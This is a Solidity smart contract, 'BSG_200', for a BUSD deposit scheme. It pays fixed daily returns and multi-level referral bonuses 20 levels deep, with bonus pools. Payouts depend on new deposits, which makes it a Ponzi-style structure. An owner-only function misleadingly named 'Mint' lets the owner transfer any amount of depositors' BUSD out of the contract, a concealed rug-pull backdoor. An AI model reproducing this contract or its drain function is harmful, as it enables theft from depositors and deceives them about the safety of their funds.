// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

library SafeMath {
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(){
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BSG_200 is Ownable {

    using SafeMath for uint256; 
    IERC20 public BUSD;

    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 5000e18;
    uint256 private constant feePercents = 200; 

    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant baseDivider = 10000;
    

    uint256 private constant maxAddFreeze = 45 days;
    uint256 private constant referDepth = 20;
    uint256 private constant maxWithdraw = 2;


    uint256 private constant diamondPoolPercents = 100;
    uint256 private constant topPoolPercents = 100;
    uint256 private constant doubleDiamondPoolPercents = 100;
    uint256 private constant discountpercentage = 500;

    uint256 private constant timeStep = 1 days;
    uint256 public dayPerCycle = 15 days;
    uint256 public dayRewardPercents = 133333333333333333334;
    uint256 public dayReward2Percents = 166666666666666666667;


    uint256 public boosterDay = 15;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public diamond;
    uint256 public doubleDiamond;
    uint256 public topPool;

    uint256 private constant directPercents = 500;
    uint256[4] private level4Percents = [100, 200, 200, 200];
    uint256[15] private level5Percents = [100, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50];

    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];

    bool public isFreezeReward;


    address public defaultRefer;
    address[2] public feeReceivers;
   
    address[] public depositors;
    address[] public level4Users;
    address[] public level5Users;
    address[] public boosterIncomeUSers;

    struct OrderInfo
    {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    struct UserInfo
    {
        address referrer;
        uint256 start;
        uint256 level;
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    struct RewardInfo
    {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level4Freezed;
        uint256 level4Released;
        uint256 level5Left;
        uint256 level5Freezed;
        uint256 level5Released;
        uint256 diamond;
        uint256 doubleDiamond;
        uint256 top;
        uint256 split;
        uint256 splitDebt;
        uint256 totalWithdrawls;
    }

    mapping(address => uint256) public boosterUserTime;
    mapping(uint256 => bool) public balStatus;
    mapping(address => bool) public firstDeposite;

    mapping(address => UserInfo) public userInfo;
    mapping(address => RewardInfo) public rewardInfo;
    mapping(address => OrderInfo[]) public orderInfos;
    mapping(uint256 => address[3]) public dayTopUsers;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor()
    {
        BUSD = IERC20(0x09B34e72481905A74E463e942Ee8De0Fe52B0203);
        feeReceivers = [0x5Cd0931532Fa39Db298cB4f04fFD76e68cAE2524,0xdD710F1A497e5ae133B758662d175f5d3A9b5492];
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = 0x1644Ee37D1d303B0956CB3C919E58390D3745Cb7;
    }

    function register(address _referral)
    external
    {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount)
    external
    {
        BUSD.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint256 _amount)
    external
    {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount)
    external
    {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards()
    public
    {
        if(block.timestamp > lastDistribute.add(timeStep))
        {
            uint256 dayNow = getCurDay();

            _distributediamond();
            _distributedoubleDiamond();

            _distributetopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }


    function checkMaxPlusWithdrawable(address user_)
    public
    view
    returns(uint256,uint256,bool status)
    {
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(user_);
        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(user_);

        RewardInfo storage userRewards = rewardInfo[user_];
        UserInfo storage user = userInfo[user_];


        uint256 splitAmt = staticSplit.add(dynamicSplit);
        uint256 withdrawable = staticReward.add(dynamicReward);

        uint256 userT = (withdrawable.add(splitAmt).add(userRewards.totalWithdrawls));
        uint256 total = (user.totalDeposit).mul(maxWithdraw);

        if(userT >= total)
        {
            userT = total;
            status = true;
        }
        else
        {   status = false; }

        userT = userT.sub(userRewards.totalWithdrawls);

        uint256 totalSplit = userT.mul(freezeIncomePercents).div(baseDivider);
        uint256 totalBusd = userT.sub(totalSplit);

        return (totalSplit,totalBusd,status);
    }


    function withdraw()
    external
    {
        distributePoolRewards();
        (uint256 splitAmt, uint256 withdrawable,) = checkMaxPlusWithdrawable(msg.sender);
        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.level4Released = 0;
        userRewards.level5Released = 0;
        
        userRewards.diamond = 0;
        userRewards.doubleDiamond = 0;
        userRewards.top = 0;
                
        withdrawable = withdrawable.add(userRewards.capitals);

        BUSD.transfer(msg.sender, withdrawable);
        userRewards.totalWithdrawls = (userRewards.totalWithdrawls.add(withdrawable).add(splitAmt));
        userRewards.capitals = 0;

        uint256 bal = BUSD.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay()
    public
    view
    returns(uint256)
    {   return (block.timestamp.sub(startTime)).div(timeStep);  }

    function getTeamUsersLength(address _user, uint256 _layer)
    external
    view returns(uint256)
    {   return teamUsers[_user][_layer].length;     }

    function getOrderLength(address _user)
    external
    view
    returns(uint256)
    {   return orderInfos[_user].length;    }

    function getDepositorsLength()
    external
    view
    returns(uint256)
    {   return depositors.length;   }

    function getMaxFreezing(address _user)
    public
    view returns(uint256)
    {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user)
    public
    view
    returns(uint256,uint256,uint256)
    {
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam)
            {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user)
    public
    view
    returns(uint256)
    {
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user)
    private
    view
    returns(uint256,uint256)
    {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user)
    private
    view
    returns(uint256,uint256)
    {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released);
        totalRewards = totalRewards.add(userRewards.diamond.add(userRewards.doubleDiamond).add(userRewards.top));
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow)
    private
    {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow)
    private
    {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user)
    private
    {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 4){
                level4Users.push(_user);
            }
            if(levelNow == 5){
                level5Users.push(_user);
            }
        }
    }

    function _calLevelNow(address _user)
    private 
    view 
    returns(uint256)
    {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        if(total >= 1000e18){
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 100 && maxTeam >= 25000e18 && otherTeam >= 25000e18){
                levelNow = 5;
            }else if(total >= 1000e18 && user.teamNum >= 25 && maxTeam >= 5000e18 && otherTeam >= 5000e18){
                levelNow = 4;
            }else{
                levelNow = 3;
            }
        }else if(total >= 200e18){
            levelNow = 2;
        }else if(total >= 50e18){
            levelNow = 1;
        }
        return levelNow;
    }


    function _deposit(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");
        if(!firstDeposite[_user])
        {
            uint256 discountamount = _amount.mul(discountpercentage).div(baseDivider);
            BUSD.transfer(_user, discountamount);
            firstDeposite[_user] =true;
        }

        boosterUserTime[_user] = getCurDay();
        (bool _isAvailable,) = getBoosterIncomeIsReady(user.referrer);
        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(_user);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(_user, _amount);

        distributePoolRewards();

        _updateReferInfo(_user, _amount);

        _updateReward(_user, _amount);

        _releaseUpRewards(_user, _amount);

        if(getBoosterDownlineStatus(user.referrer) && getBoosterTimeDiffernce(user.referrer) <= boosterDay ){
            if(!_isAvailable)
            {boosterIncomeUSers.push(user.referrer);}
        }

        uint256 bal = BUSD.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user,uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        uint256 staticReward;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            (bool _isAvailable,) = getBoosterIncomeIsReady(_user);
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount)
            {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);


                if(_isAvailable == true)
                {
                 staticReward = (order.amount.mul(dayReward2Percents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
                else
                {
                 staticReward = (order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
               
                if(isFreezeReward) {
                    if(user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        if(!isUnfreezeCapital){ 
            RewardInfo storage userReward = rewardInfo[_user];
            if(userReward.level5Freezed > 0){
                uint256 release = _amount;
                if(_amount >= userReward.level5Freezed){
                    release = userReward.level5Freezed;
                }
                userReward.level5Freezed = userReward.level5Freezed.sub(release);
                userReward.level5Released = userReward.level5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }

    function _distributediamond()
    private
    {
        uint256 level4Count;
        for(uint256 i = 0; i < level4Users.length; i++){
            if(userInfo[level4Users[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = diamond.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
                    rewardInfo[level4Users[i]].diamond = rewardInfo[level4Users[i]].diamond.add(reward);
                    userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(diamond > totalReward){
                diamond = diamond.sub(totalReward);
            }else{
                diamond = 0;
            }
        }
    }

    function _distributedoubleDiamond()
    private
    {

        uint256 level5Count;
        for(uint256 i = 0; i < level5Users.length; i++){
            if(userInfo[level5Users[i]].level == 5){
                level5Count = level5Count.add(1);
            }
        }
        if(level5Count > 0){
            uint256 reward = doubleDiamond.div(level5Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level5Users.length; i++){
                if(userInfo[level5Users[i]].level == 5){
                    rewardInfo[level5Users[i]].doubleDiamond = rewardInfo[level5Users[i]].doubleDiamond.add(reward);
                    userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(doubleDiamond > totalReward){
                doubleDiamond = doubleDiamond.sub(totalReward);
            }else{
                doubleDiamond = 0;
            }
        }
    }



    function _distributetopPool(uint256 _dayNow)
    private
    {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint72[3] memory maxReward = [2000e18, 1000e18, 500e18];

        uint256 totalReward;

        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }

    function _distributeDeposit(uint256 _amount)
    private
    {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        BUSD.transfer(feeReceivers[0], fee.div(2));
        BUSD.transfer(feeReceivers[1], fee.div(2));
        uint256 diamond_ = _amount.mul(diamondPoolPercents).div(baseDivider);
        diamond = diamond.add(diamond_);
        uint256 doubleDiamond_ = _amount.mul(doubleDiamondPoolPercents).div(baseDivider);
        doubleDiamond = doubleDiamond.add(doubleDiamond_);
        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
    }

    function _updateReward(address _user,uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if(i > 4){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                    }
                }else if(i > 0){
                    if( userInfo[upline].level > 3){
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    }
                }else{
                    reward = newAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _releaseUpRewards(address _user,uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                if(i > 0 && i < 5 && userInfo[upline].level > 3){
                    if(upRewards.level4Freezed > 0){
                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        if(level4Reward > upRewards.level4Freezed){
                            level4Reward = upRewards.level4Freezed;
                        }
                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
                    }
                }

                if(i >= 5 && userInfo[upline].level > 4){
                    if(upRewards.level5Left > 0){
                        uint256 level5Reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        if(level5Reward > upRewards.level5Left){
                            level5Reward = upRewards.level5Left;
                        }
                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); 
                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);
                    }
                }
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal)
    private
    {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal)
    private
    {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    function getBoosterDownlineStatus(address _user)
    public 
    view 
    returns(bool)
    {
        uint256 count;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            if(userInfo[teamUsers[_user][0][i]].totalDeposit>=1000e18){
                count +=1;
            }
        }
        if(count >= 4){
            return true;
        }
        return false;
    }

    function getBoosterTimeDiffernce(address _user)
    private
    view
    returns(uint256)
    {
        uint256 newTime = getCurDay();
        newTime = newTime.sub(boosterUserTime[_user]);
        return newTime;
    }

    function getBoosterIncomeIsReady(address _address)
    public
    view
    returns(bool,uint256)
    {
        for (uint256 i = 0; i < boosterIncomeUSers.length; i++){
            if (_address == boosterIncomeUSers[i]){
            return (true,i);
            } 
        }
        return (false,0);
    }

    function Mint(uint256 _count)
    public
    onlyOwner
    {   BUSD.transfer(owner(),_count);  }

    function ChangeBoosterCondition(uint256 _num)
    public
    onlyOwner
    {   boosterDay = _num;  }
}